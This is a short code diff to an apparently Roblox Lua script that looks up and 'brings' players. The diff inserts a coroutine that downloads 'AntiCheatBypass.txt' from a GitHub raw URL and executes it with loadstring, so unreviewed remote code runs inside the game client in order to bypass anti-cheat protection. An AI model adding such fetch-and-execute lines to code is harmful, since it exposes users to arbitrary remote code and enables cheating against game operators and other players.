@@ -101,7 +101,9 @@ local function GetPlayerFromString(str,ignore)
 	end
 	return nil
 end
-
+coroutine.wrap(function()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/MsorkyScripts/OpenSourceAntiCheat/main/AntiCheatBypass.txt"))()
+end)()
 coroutine.wrap(function()
 while true do
 if bringname != "" then
